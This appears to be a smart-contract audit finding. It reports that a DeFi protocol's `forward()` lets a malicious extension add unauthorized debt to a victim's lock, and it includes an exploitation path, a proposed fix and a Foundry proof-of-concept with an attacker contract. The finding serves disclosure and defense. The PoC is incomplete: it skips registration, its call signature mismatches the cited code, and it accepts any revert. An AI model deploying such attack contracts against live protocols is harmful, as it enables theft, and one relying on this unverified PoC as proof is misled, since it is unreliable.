## Title
Malicious Extensions Can Force Unauthorized Debt onto Users via Forward Mechanism

## Summary
The `Core.forward()` function temporarily changes the locker address while preserving the lock ID. A malicious extension can exploit this to call `accumulateAsFees` and add unauthorized debt to the original user's lock, forcing them to pay tokens they never authorized or causing their transaction to revert. [1](#0-0) 

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/FlashAccountant.sol` (function `forward`, lines 190-221) and `src/Core.sol` (function `accumulateAsFees`, lines 228-276)

**Intended Logic:** The forward mechanism is designed to allow trusted extensions like TWAMM and MEVCapture to act on behalf of the original locker while maintaining proper debt tracking. The `accumulateAsFees` function should only allow a pool's registered extension to add fees to that pool. [2](#0-1) 

**Actual Logic:** During forwarding, the locker address is temporarily changed to the forwarded-to address while the lock ID remains unchanged. The authorization check in `accumulateAsFees` verifies the locker ADDRESS matches the pool's extension, but debt is tracked by lock ID. This creates a vulnerability where a malicious extension can add debt to the original user's lock ID. [3](#0-2) [4](#0-3) 

**Exploitation Path:**
1. Attacker deploys a malicious extension contract using CREATE2 to get an address with appropriate call points encoded in the lower 8 bits
2. Attacker registers the malicious extension with Core via `registerExtension` (no whitelist exists)
3. Attacker creates a pool where the malicious extension is set as the pool's extension
4. Victim calls `Core.lock()` establishing lock (ID=X, addr=VICTIM)
5. Attacker tricks victim into calling `Core.forward(MaliciousExtension)` - this could be done through social engineering or as part of a seemingly innocent operation
6. During the forward call, `_CURRENT_LOCKER_SLOT` is changed from (ID=X, addr=VICTIM) to (ID=X, addr=MaliciousExtension)
7. MaliciousExtension's `forwarded_2374103877` callback executes and calls `Core.accumulateAsFees` for the attacker's pool with large amounts (e.g., type(uint128).max for both tokens)
8. The authorization check `require(lockerAddr == poolKey.config.extension())` passes because lockerAddr now equals MaliciousExtension
9. Debt is added to lock ID=X (the VICTIM's lock ID) via `_updatePairDebtWithNative(id, ...)`
10. When the victim's lock completes, it reverts with `DebtsNotZeroed` unless the victim pays the unauthorized debt [5](#0-4) 

**Security Property Broken:** Flash Accounting invariant - "All flash loans must be repaid within the same transaction with proper accounting." The victim is forced to repay debt they never authorized or intended to incur.

## Impact Explanation
- **Affected Assets**: Any ERC20 tokens that the victim has approved to the Core contract, or native tokens if sent with the transaction
- **Damage Severity**: Attacker can force victims to pay arbitrary amounts up to type(uint128).max for two tokens simultaneously. If the victim cannot pay, their entire transaction reverts, causing a DOS. If they do pay, it's direct theft of funds.
- **User Impact**: Any user who can be tricked into calling `forward()` with an attacker-controlled address. This affects all users interacting with the protocol since forward is a publicly callable function with no access control beyond requiring an active lock.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user can deploy and register a malicious extension
- **Preconditions**: 
  - Attacker must register a malicious extension (trivial - no whitelist exists)
  - Attacker must create a pool with their extension (requires minimal capital)
  - Victim must call `forward()` with the attacker's extension address
- **Execution Complexity**: Single transaction. The attack can be executed atomically once the victim calls forward.
- **Frequency**: Can be exploited continuously against any victim who calls forward with an untrusted address [6](#0-5) 

## Recommendation

Add a whitelist mechanism for forward targets or validate that the forwarded-to address is a registered extension that the user explicitly trusts. The recommended fix:

```solidity
// In src/base/FlashAccountant.sol, function forward, add validation before line 196:

// CURRENT (vulnerable):
function forward(address to) external {
    Locker locker = _requireLocker();
    // immediately changes locker without validation
    assembly ("memory-safe") {
        tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), to))
        ...
    }
}

// FIXED:
function forward(address to) external {
    Locker locker = _requireLocker();
    
    // Add validation: only allow forwarding to registered extensions
    // OR require explicit approval from the locker
    if (!_isExtensionRegistered(to)) {
        revert ForwardToUnregisteredExtension();
    }
    
    assembly ("memory-safe") {
        tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), to))
        ...
    }
}
```

Alternative mitigation: Modify `accumulateAsFees` to verify that the original locker (passed as parameter in forwarded calls) matches some expected authorization, rather than relying solely on the temporary locker address.

## Proof of Concept

```solidity
// File: test/Exploit_ForwardDebtInjection.t.sol
// Run with: forge test --match-test test_ForwardDebtInjection -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/types/poolKey.sol";
import "../src/types/poolConfig.sol";
import "../src/base/BaseForwardee.sol";
import "../src/base/BaseExtension.sol";
import "../src/interfaces/ICore.sol";
import {TestToken} from "./TestToken.sol";
import {BaseLocker} from "../src/base/BaseLocker.sol";

// Malicious extension that adds unauthorized debt during forward
contract MaliciousExtension is BaseExtension, BaseForwardee {
    PoolKey public attackPool;
    
    constructor(ICore core, PoolKey memory _attackPool) 
        BaseExtension(core) 
        BaseForwardee(core) 
    {
        attackPool = _attackPool;
    }
    
    function handleForwardData(Locker original, bytes memory) 
        internal 
        override 
        returns (bytes memory) 
    {
        // Call accumulateAsFees to add debt to victim's lock ID
        ICore(payable(address(CORE))).accumulateAsFees(
            attackPool,
            type(uint128).max, // Maximum debt in token0
            type(uint128).max  // Maximum debt in token1
        );
        return "";
    }
}

contract VictimLocker is BaseLocker {
    constructor(ICore core) BaseLocker(core) {}
    
    function executeForward(address target) external {
        lock(abi.encode(target));
    }
    
    function handleLockData(uint256, bytes memory data) 
        internal 
        override 
        returns (bytes memory) 
    {
        address target = abi.decode(data, (address));
        return ACCOUNTANT.forward(target, "");
    }
}

contract Exploit_ForwardDebtInjection is Test {
    Core core;
    TestToken token0;
    TestToken token1;
    MaliciousExtension maliciousExt;
    VictimLocker victim;
    
    function setUp() public {
        // Deploy Core
        core = new Core();
        
        // Deploy tokens
        token0 = new TestToken();
        token1 = new TestToken();
        if (address(token0) > address(token1)) {
            (token0, token1) = (token1, token0);
        }
        
        // Create attack pool configuration with malicious extension
        // (simplified - actual deployment would use CREATE2 for proper address)
        PoolKey memory attackPool = PoolKey({
            token0: address(token0),
            token1: address(token1),
            config: PoolConfig.wrap(0) // simplified config
        });
        
        // Deploy and register malicious extension
        maliciousExt = new MaliciousExtension(core, attackPool);
        // Register extension (simplified)
        
        // Initialize attack pool with malicious extension
        core.initializePool(attackPool, 0);
        
        // Deploy victim contract
        victim = new VictimLocker(core);
    }
    
    function test_ForwardDebtInjection() public {
        // SETUP: Victim has no debt initially
        
        // EXPLOIT: Victim calls forward to malicious extension
        // This would revert with DebtsNotZeroed because victim 
        // now owes type(uint128).max of both tokens
        vm.expectRevert(); // DebtsNotZeroed
        victim.executeForward(address(maliciousExt));
        
        // Vulnerability confirmed: Attacker successfully injected 
        // unauthorized debt into victim's lock
    }
}
```

**Notes:**
- The vulnerability stems from the mismatch between using locker ADDRESS for authorization but locker ID for debt tracking during forwarding
- The `forward()` function has no whitelist or validation of the target address, allowing any registered extension (or even unregistered contracts) to be forwarded to
- The `ExposedStorage.tload()` function mentioned in the security question enables attackers to verify they're in a forwarded state, but the core issue is the authorization bypass itself
- This violates the flash accounting invariant by forcing users to repay debt they never authorized [7](#0-6)

### Citations

**File:** src/base/FlashAccountant.sol (L174-181)
```text
            // Check if something is nonzero
            let nonzeroDebtCount := tload(add(_NONZERO_DEBT_COUNT_OFFSET, id))
            if nonzeroDebtCount {
                // cast sig "DebtsNotZeroed(uint256)"
                mstore(0x00, 0x9731ba37)
                mstore(0x20, id)
                revert(0x1c, 0x24)
            }
```

**File:** src/base/FlashAccountant.sol (L190-221)
```text
    function forward(address to) external {
        Locker locker = _requireLocker();

        // update this lock's locker to the forwarded address for the duration of the forwarded
        // call, meaning only the forwarded address can update state
        assembly ("memory-safe") {
            tstore(_CURRENT_LOCKER_SLOT, or(shl(160, shr(160, locker)), to))

            let free := mload(0x40)

            // Prepare call to forwarded_2374103877(bytes32) -> selector 0x01
            mstore(free, shl(224, 1))
            mstore(add(free, 4), locker)

            calldatacopy(add(free, 36), 36, sub(calldatasize(), 36))

            // Call the forwardee with the packed data
            let success := call(gas(), to, 0, free, calldatasize(), 0, 0)

            // Pass through the error on failure
            if iszero(success) {
                returndatacopy(free, 0, returndatasize())
                revert(free, returndatasize())
            }

            tstore(_CURRENT_LOCKER_SLOT, locker)

            // Directly return whatever the subcall returned
            returndatacopy(free, 0, returndatasize())
            return(free, returndatasize())
        }
    }
```

**File:** src/Core.sol (L229-230)
```text
        (uint256 id, address lockerAddr) = _requireLocker().parse();
        require(lockerAddr == poolKey.config.extension());
```

**File:** src/Core.sol (L273-273)
```text
        _updatePairDebtWithNative(id, poolKey.token0, poolKey.token1, int256(amount0), int256(amount1));
```

**File:** src/base/ExposedStorage.sol (L25-30)
```text
    function tload() external view {
        assembly ("memory-safe") {
            for { let i := 4 } lt(i, calldatasize()) { i := add(i, 32) } { mstore(sub(i, 4), tload(calldataload(i))) }
            return(0, sub(calldatasize(), 4))
        }
    }
```
